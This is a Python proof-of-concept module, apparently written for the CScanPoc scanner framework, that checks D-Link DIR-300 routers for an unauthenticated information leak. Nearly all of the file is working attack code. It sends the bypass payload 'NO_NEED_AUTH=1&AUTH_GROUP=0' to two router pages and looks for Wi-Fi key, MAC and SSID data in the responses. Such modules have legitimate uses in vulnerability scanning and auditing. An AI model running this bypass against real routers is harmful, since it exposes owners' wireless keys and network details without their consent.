# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time
import re


class Vuln(ABVuln):
    vuln_id = 'D-Link_0011'  # 平台漏洞编号，留空
    name = 'D-Link 未授权访问'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        D-Link DIR-300 非授权访问相关页面导致路由信息泄露。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'D-Link'  # 漏洞应用名称
    product_version = 'DIR-300'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd0f2f880-4cda-4241-96ac-9f74aece387d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            """
            POC Name  :  D-Link DIR-300 2处未授权访问
            Author    :  a
            mail      :  a@lcx.cc
            Referer   :  http://www.wooyun.org/bugs/wooyun-2010-066799
            """
            hh = hackhttp.hackhttp()
            payload = (
                '/bsc_wlan.php?NO_NEED_AUTH=1&AUTH_GROUP=0',
                '/st_device.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
            )
            url1 = self.target + payload[0]
            code, head, res, errcode, _ = hh.http(url1)

            if code == 200 and 'Wi-Fi Protected' in res and 'WEP Key' in res:
                # security_hole(url1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            url2 = self.target + payload[1]
            code, head, res, errcode, _ = hh.http(url2)
            if code == 200 and 'MAC' in res and 'SSID' in res:
                # security_hole(url2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
